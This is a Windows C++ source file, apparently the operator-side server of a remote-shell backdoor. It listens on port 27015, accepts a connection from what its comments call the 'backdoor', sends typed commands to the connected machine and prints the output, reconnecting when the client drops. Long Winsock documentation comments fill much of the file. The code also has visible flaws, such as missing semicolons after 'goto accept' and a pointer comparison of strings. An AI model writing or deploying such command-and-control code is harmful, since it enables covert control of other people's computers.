/** 
 * MIT License 
 *
 * Copyright 2017 s3q
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
 * copies of the Software, and to permit persons to whom the Software is 
 * furnished to do so, subject to the following conditions:
 
 * The above copyright notice and this permission notice shall be included in 
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE 
 * SOFTWARE.
 *
 * /////////////////////////////////////////////////////////////////////////////
 * 
 * Name: server.cpp
 *
 * Description: 
 *
 * Sources:
 *   1. winbase.h header : https://docs.microsoft.com/en-us/windows/win32/api/winbase/
 *   2. unistd.h header: https://www.ibm.com/docs/en/aix/7.2?topic=files-unistdh-file
 *   3. ws2tcpip.h header : https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/
 *   4. fstream : https://www.cplusplus.com/reference/fstream/fstream/
 *   5. cstdlib : https://www.cplusplus.com/reference/cstdlib/
 
 *   6. WinMain function : https://docs.microsoft.com/en-us/windows/win32/learnwin32/winmain--the-application-entry-point 
 *   7. AllocConsole function : https://docs.microsoft.com/en-us/windows/console/allocconsole
 *   8. FindWindowA function : https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa
 *   9. ShowWindow function :  https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
 *   10. WSAStartup function : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
 *   11. ZeroMemory function : https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366920(v=vs.85)
 *   12. htons function :  https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons
 *   13. recv function : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
 *   14. connect function : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
 *   15. send function : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send
 *   16. fgets function : https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/fgets-fgetws?view=msvc-160 
 *   8. 
 *   

 *
 * Notes:
 * 
 * 
*/

#include <iostream>
#include <WS2tcpip.h>
#include <WinSock2.h>
#include <unistd.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define DEFAULT_BUFLEN 40690
#define DEFAULT_TOTALE_BUFLEN 651040
#define DEFAULT_PORT 27015

int main()
{

    // ############# --- Initialze wonsock --- #############
    /**
     * The WSADATA structure contains information about the Windows Sockets implementation.
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata
    */
    WSADATA wsData;

    /**
     * Creates a WORD value by concatenating the specified values.
     * 
     * Parameters :
     * BYTE bLow -> The low-order byte of the new value.
     * BYTE bHigh -> The high-order byte of the new value.
     * 
     * Return value : WORD
     * The return value is a WORD value.
    */
    WORD ver = MAKEWORD(2, 2);

    /**
     * The WSAStartup function initiates use of the Winsock DLL by a process.
     
     * Parameters :
     * WORD wVersionRequired ->
     * LPWSADATA lpWSAData ->
     
     * Return value : int
     * If successful, the WSAStartup function returns zero. Otherwise, it returns one of the error codes listed below.  
     *   - WSASYSNOTREADY -> The underlying network subsystem is not ready for network communication.
     *   - WSAVERNOTSUPPORTED -> The version of Windows Sockets support requested is not provided by this particular Windows Sockets implementation.
     *   - WSAEINPROGRESS -> A blocking Windows Sockets 1.1 operation is in progress.
     *   - WSAEPROCLIM -> 	A limit on the number of tasks supported by the Windows Sockets implementation has been reached.
     *   - WSAEFAULT -> The lpWSAData parameter is not a valid pointer.
     * 
     * Remarks :
     * The WSAStartup function must be the first Windows Sockets function called by an application or DLL. It allows an application or DLL to specify the version of Windows Sockets required and retrieve details of the specific Windows Sockets implementation. The application or DLL can only issue further Windows Sockets functions after successfully calling WSAStartup.
     * 
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup 
    */
    int wsOK = WSAStartup(ver, &wsData);

    // if not initialzed successuflly :
    if (wsOK != 0)
    {
        cerr << "[ERR] - Can't initialze winsock ! ... Quitting" << endl;
        return 1;
    }
    // ############# ------ #############

    // ############# --- create a socket --- #############
    /**
     * The socket function creates a socket that is bound to a specific transport service provider.
     * 
     * Parameters :
     * int af -> The address family specification : 
     *   - AF_UNSPEC -> 0 -> The address family is unspecified.
     *   - AF_INET -> 2 -> The Internet Protocol version 4 (IPv4) address family.
     *   - AF_IPX -> 6 -> The IPX/SPX address family.
     *   - AF_APPLETALK -> 16 -> The AppleTalk address family. This address family is only supported if the AppleTalk protocol is installed.
     *   - AF_NETBIOS -> 17 -> The NetBIOS address family. This address family is only supported if the Windows Sockets provider for NetBIOS is installed.
     *   - AF_INET6 -> 23 -> The Internet Protocol version 6 (IPv6) address family.
     *   - AF_IRDA -> 26 -> The Infrared Data Association (IrDA) address family.
     *   - AF_BTH -> 32 -> The Bluetooth address family.
     * int type -> The type specification for the new socket :
     *   - SOCK_STREAM -> 1 -> A socket type that provides sequenced
     *   - SOCK_DGRAM -> 2 -> A socket type that supports datagrams
     *   - SOCK_RAW -> 3 -> A socket type that provides a raw socket that allows an application to manipulate the next upper-layer protocol header
     *   - SOCK_RDM -> 4 -> A socket type that provides a reliable message datagram.
     *   - SOCK_SEQPACKET -> 5 -> A socket type that provides a pseudo-stream packet based on datagrams.
     * 
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket 
    */
    SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);
    char *optval;

    // quit if invalid socket :
    if (listening == INVALID_SOCKET)
    {
        cerr << "[ERR] - Can't create a socket ! ... Quitting" << endl;
        return 1;
    }

    /**
     * The setsockopt function sets a socket option.
     * 
     * Paramters :
     * SOCKET s -> A descriptor that identifies a socket.
     * int level -> The level at which the option is defined (for example, SOL_SOCKET).
     * int optname -> The socket option for which the value is to be set (for example, SO_BROADCAST). The optname parameter must be a socket option defined within the specified level, or behavior is undefined.
     * const char *optval -> A pointer to the buffer in which the value for the requested option is specified.
     * int optlen -> The size, in bytes, of the buffer pointed to by the optval parameter.
    */
    if (setsockopt(listening, SOL_SOCKET, SO_REUSEADDR, optval, sizeof(optval)) < 0)
    {
        printf("[ERR] - Error Setting TCP Sockte Options!\n");
        return 1;
    }
    // ############# ------ #############

    // ############# --- bind the socket --- #############
    // bind the socket to an ip address and port to a socket
    /**
     * The sockaddr structure varies depending on the protocol selected. Except for the sin*_family parameter, sockaddr contents are expressed in network byte order.
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
    */
    sockaddr_in hint;

    // identification hint :
    hint.sin_family = AF_INET;
    hint.sin_port = htons(DEFAULT_PORT);
    hint.sin_addr.S_un.S_addr = INADDR_ANY; // Could also use inet_pton

    /**
     * The bind function associates a local address with a socket.
     * 
     * Paramters :
     * SOCKET s -> A descriptor identifying an unbound socket.
     * const sockaddr *addr -> A pointer to a sockaddr structure of the local address to assign to the bound socket .
     * int namelen -> The length, in bytes, of the value pointed to by the name parameter.
     * 
     * Return value :
     * If no error occurs, bind returns zero. Otherwise, it returns SOCKET_ERROR, and a specific error code can be retrieved by calling WSAGetLastError.
     *   - WSANOTINITIALISED - A successful WSAStartup call must occur before using this function.
     *   - WSAENETDOWN - The network subsystem has failed.
     * 
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind
    */
    bind(listening, (sockaddr *)&hint, sizeof(hint));
    // ############# ------ #############

    // ############# --- listening & wait connection for backdoor --- #############
    // tell winsock the socket is for listening
    /**
     * The listen function places a socket in a state in which it is listening for an incoming connection.
     * 
     * Paramters : 
     * SOCKET s -> A descriptor identifying a bound, unconnected socket.
     * int backlog -> The maximum length of the queue of pending connections. If set to SOMAXCONN, the underlying service provider responsible for socket s will set the backlog to a maximum reasonable value.
     * 
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen
    */
    listen(listening, SOMAXCONN);

    // wait for a connection
    sockaddr_in client;
    int clientSize = sizeof(client);

    /**
     * The accept function permits an incoming connection attempt on a socket.
     * 
     * Paramters : 
     * SOCKET s -> A descriptor that identifies a socket that has been placed in a listening state with the listen function. The connection is actually made with the socket that is returned by accept.
     * sockaddr *addr -> An optional pointer to a buffer that receives the address of the connecting entity, as known to the communications layer.
     * int *addrlen -> An optional pointer to an integer that contains the length of structure pointed to by the addr parameter.
     * 
     * Return value :
     * If no error occurs, accept returns a value of type SOCKET that is a descriptor for the new socket. 
     * This returned value is a handle for the socket on which the actual connection is made.
     *   - WSANOTINITIALISED - A successful WSAStartup call must occur before using this function.
     *   - WSAENETDOWN - The network subsystem has failed.
     * 
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept
    */
accept:
    SOCKET clientSocket = accept(listening, (sockaddr *)&client, &clientSize);
    // ############# ------ #############

    //  send data ( command ) from a connected socket ( backdoor )
    char buffer[DEFAULT_BUFLEN];
    // receives data ( command response )
    char response[DEFAULT_TOTALE_BUFLEN];

    // while loop -> send commands && receives responses
    while (true)
    {
        // Fills a block of memory with zeros, for setting it empty :
        ZeroMemory(buffer, sizeof(buffer));
        ZeroMemory(response, sizeof(response));

        cout << "[SHELL] - # " << inet_ntoa(client.sin_addr) << " ~ $ ";

        /**
         * Get a string from a stream.
         * 
         * Paramters :
         * char *str -> Storage location for data.
         * int numChars -> Maximum number of characters to read.
         * FILE *stream -> Pointer to FILE structure.
         * 
         * Return value : 
         * Each of these functions returns str. NULL is returned to indicate an error or an end-of-file condition. 
         * Use feof or ferror to determine whether an error occurred.
         * 
         * moreinfo -> https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/fgets-fgetws?view=msvc-160
        */
        fgets(buffer, sizeof(buffer), stdin);

        // remove /n from end of string :
        strtok(buffer, "\n");

        /**
         * The send function sends data on a connected socket.
         * 
         * Paramters : 
         * SOCKET s -> A descriptor identifying a connected socket.
         * char *buf -> A pointer to a buffer containing the data to be transmitted.
         * int len -> The length, in bytes, of the data in buffer pointed to by the buf parameter.
         * int flags -> A set of flags that specify the way in which the call is made :
         *   - MSG_DONTROUTE -> Specifies that the data should not be subject to routing. A Windows Sockets service provider can choose to ignore this flag.
         *   - MSG_OOB -> Sends OOB data (stream-style socket such as SOCK_STREAM only.
         * 
         * Return value : 
         * If no error occurs, send returns the total number of bytes sent, which can be less than the number requested to be sent in the len parameter.
         * 
         *   - WSANOTINITIALISED - A successful WSAStartup call must occur before using this function.
         *   - WSAENETDOWN - The network subsystem has failed.
         * 
         * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send
        */
        int bytesSend = send(clientSocket, buffer, sizeof(buffer), 0);

        // quit :
        if (buffer == "q")
        {
            break;
        }
        else
        {
            // wait for client to send data
            /**
             * The recv function receives data from a connected socket or a bound connectionless socket.
             * 
             * Parameters :
             * SOCKET s -> The descriptor that identifies a connected socket. -> socket function 
             * char *buf -> A pointer to the buffer to receive the incoming data.
             * int len -> The length, in bytes, of the buffer pointed to by the buf parameter.
             * int flags -> A set of flags that influences the behavior of this function
             * 
             * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
             * 
             * Return value :
             * If no error occurs, recv returns the number of bytes received and the buffer pointed to by the buf parameter will contain this data received. 
             * If the connection has been gracefully closed, the return value is zero.
             *   - WSANOTINITIALISED - A successful WSAStartup call must occur before using this function.
             *   - WSAENETDOWN - The network subsystem has failed.
            */
            int bytesRecv = recv(clientSocket, response, sizeof(response), 0x8);

            // filed receives data ( error in socket ) : 
            if (bytesRecv == SOCKET_ERROR)
            {
                cerr << "[ERR] - Error in recv() ! . Quitting" << endl;
                // accept for connect again :  
                goto accept
            }

            // The connection has been disconnected :
            if (bytesRecv == 0)
            {
                cout << "[ERR] - Client disconnected " << endl;
                // accept for connect again :  
                goto accept
            }

            // print command response 
            cout << response;
        }
    }
}
